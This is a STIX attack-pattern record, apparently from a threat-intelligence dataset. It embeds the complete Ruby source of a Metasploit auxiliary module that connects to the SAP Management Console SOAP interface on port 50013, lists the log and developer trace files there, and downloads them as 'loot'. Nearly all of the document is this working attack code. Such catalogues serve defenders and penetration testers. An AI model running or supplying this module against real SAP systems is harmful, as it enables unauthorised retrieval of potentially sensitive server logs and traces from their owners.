{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1156d79c-8e92-4811-84f2-771bf78eabdf",
    "created": "2024-08-14T16:27:01.291529Z",
    "modified": "2024-08-14T16:27:01.291532Z",
    "name": "SAP Management Console Get Logfile",
    "description": " This module simply attempts to download available logfiles and developer tracefiles through the SAP Management Console SOAP Interface. Please use the sap_mgmt_con_listlogfiles extension to view a list of available files.  'References'   => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_mgmt_con_getlogfiles.rb",
            "external_id": "sap_mgmt_con_getlogfiles.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'SAP Management Console Get Logfile',\n      'Description'  => %q{\n        This module simply attempts to download available logfiles and\n        developer tracefiles through the SAP Management Console SOAP\n        Interface. Please use the sap_mgmt_con_listlogfiles\n        extension to view a list of available files.\n        },\n      'References'   =>\n        [\n          # General\n          [ 'URL', 'https://blog.c22.cc' ]\n        ],\n      'Author'       =>\n        [\t'Chris John Riley', # original msf module\n          'Bruno Morisson <bm[at]integrity.pt>' # bulk file retrieval\n        ],\n      'License'      => MSF_LICENSE\n    )\n\n\n    register_options(\n      [\n        Opt::RPORT(50013),\n        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),\n        OptString.new('RFILE', [ true, 'The name of the file to download ', 'sapstart.log']),\n        OptEnum.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE', ['TRACEFILE','LOGFILE']]),\n        OptBool.new('GETALL', [ false, 'Download all available files (WARNING: may take a long time!)', false])\n      ])\n    register_autofilter_ports([ 50013 ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'uri'      => normalize_uri(datastore['URI']),\n      'method'   => 'GET'\n    }, 25)\n\n    if not res\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to connect\")\n      return\n    end\n    if datastore['GETALL']\n      listfiles(ip)\n    else\n      gettfiles(rhost,\"#{datastore['RFILE']}\",'')\n    end\n\n  end\n\n  def listfiles(rhost)\n    print_status(\"[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}\")\n    success = false\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    xsi = 'http://www.w3.org/2001/XMLSchema-instance'\n    xs = 'http://www.w3.org/2001/XMLSchema'\n    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'\n\n    case datastore['FILETYPE'].to_s\n    when /^LOG/i\n      ns1 = 'ns1:ListLogFiles'\n    when /^TRACE/i\n      ns1 = 'ns1:ListDeveloperTraces'\n    else\n      print_error(\"#{rhost}:#{rport} [SAP] unsupported filetype #{datastore['FILETYPE']}\")\n      return\n    end\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"' + soapenv + '\"  xmlns:xsi=\"' + xsi + '\" xmlns:xs=\"' + xs + '\">' + \"\\r\\n\"\n    data << '<SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<sapsess:Session xlmns:sapsess=\"' + sapsess + '\">' + \"\\r\\n\"\n    data << '<enableSession>true</enableSession>' + \"\\r\\n\"\n    data << '</sapsess:Session>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '<' + ns1 + ' xmlns:ns1=\"urn:SAPControl\"></' + ns1 + '>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    begin\n      res = send_request_raw({\n        'uri'      => normalize_uri(datastore['URI']),\n        'method'   => 'POST',\n        'data'     => data,\n        'headers'  =>\n          {\n            'Content-Length' => data.length,\n            'SOAPAction'     => '\"\"',\n            'Content-Type'   => 'text/xml; charset=UTF-8',\n          }\n      }, 30)\n\n      env = []\n      if res and res.code == 200\n        case res.body\n        when /<file>(.*)<\\/file>/i\n          body = []\n          body = res.body\n          env = body.scan(/<filename>(.*?)<\\/filename><size>(.*?)<\\/size><modtime>(.*?)<\\/modtime>/i)\n          success = true\n        end\n      elsif res and res.code == 500\n        case res.body\n        when /<faultstring>(.*)<\\/faultstring>/i\n          faultcode = $1.strip\n          fault = true\n        end\n      end\n\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to attempt authentication\")\n      return\n    end\n\n    if success\n      print_good(\"#{rhost}:#{rport} [SAP] #{datastore['FILETYPE'].downcase}: #{env.length} files available\")\n\n      env.each do |output|\n        gettfiles(rhost,output[0],output[1])\n      end\n\n      return\n\n    elsif fault\n      print_error(\"#{rhost}:#{rport} [SAP] Error code: #{faultcode}\")\n      return\n\n    else\n      print_error(\"#{rhost}:#{rport} [SAP] failed to list files\")\n      return\n    end\n  end\n\n  def gettfiles(rhost,logfile,filelen)\n    if filelen\n      print_status(\"#{rhost}:#{rport} [SAP] Attempting to retrieve file #{logfile} (#{filelen} bytes)\")\n    else\n      print_status(\"#{rhost}:#{rport} [SAP] Attempting to retrieve file #{logfile} (size unknown)\")\n    end\n    success = false\n\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    xsi = 'http://www.w3.org/2001/XMLSchema-instance'\n    xs = 'http://www.w3.org/2001/XMLSchema'\n    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'\n\n    case datastore['FILETYPE'].to_s\n    when /^LOG/i\n      ns1 = 'ns1:ReadLogFile'\n    when /^TRACE/i\n      ns1 = 'ns1:ReadDeveloperTrace'\n    else\n      print_error(\"#{rhost}:#{rport} [SAP] unsupported filetype: #{datastore['FILETYPE']}\")\n      return\n    end\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"' + soapenv + '\"  xmlns:xsi=\"' + xsi + '\" xmlns:xs=\"' + xs + '\">' + \"\\r\\n\"\n    data << '<SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<sapsess:Session xlmns:sapsess=\"' + sapsess + '\">' + \"\\r\\n\"\n    data << '<enableSession>true</enableSession>' + \"\\r\\n\"\n    data << '</sapsess:Session>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '<' + ns1 + ' xmlns:ns1=\"urn:SAPControl\"><filename>' + logfile + '</filename></' + ns1 + '>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    begin\n      res = send_request_raw({\n        'uri'      => normalize_uri(datastore['URI']),\n        'method'   => 'POST',\n        'data'     => data,\n        'headers'  =>\n          {\n            'Content-Length' => data.length,\n            'SOAPAction'     => '\"\"',\n            'Content-Type'   => 'text/xml; charset=UTF-8',\n          }\n      }, 120)\n\n      env = []\n\n      if res and res.code == 200\n        case res.body\n        when /<item>([^<]+)<\\/item>/i\n          body = []\n          body = res.body\n          env = body.scan(/<item>([^<]+)<\\/item>/i)\n          success = true\n        end\n\n        case res.body\n        when /<name>([^<]+)<\\/name>/i\n          name = $1.strip\n          success = true\n        end\n\n      elsif res and res.code == 500\n        case res.body\n        when /<faultstring>(.*)<\\/faultstring>/i\n          faultcode = $1.strip\n          fault = true\n        end\n      end\n\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to connect\")\n      return\n    end\n\n    if success\n      print_good(\"#{rhost}:#{rport} [SAP] #{datastore['FILETYPE'].downcase}:#{logfile.downcase} looted\")\n      addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB\n      p = store_loot(\n        \"sap.#{datastore['FILETYPE'].downcase}.file\",\n        \"text/xml\",\n        addr,\n        res.body,\n        \"sap_#{logfile.downcase}.xml\",\n        \"SAP Get Logfile\"\n      )\n      print_status(\"Logfile stored in: #{p}\")\n    elsif fault\n      print_error(\"#{rhost}:#{rport} [SAP] Error code: #{faultcode}\")\n      return\n    else\n      print_error(\"#{rhost}:#{rport} [SAP] failed to download file\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}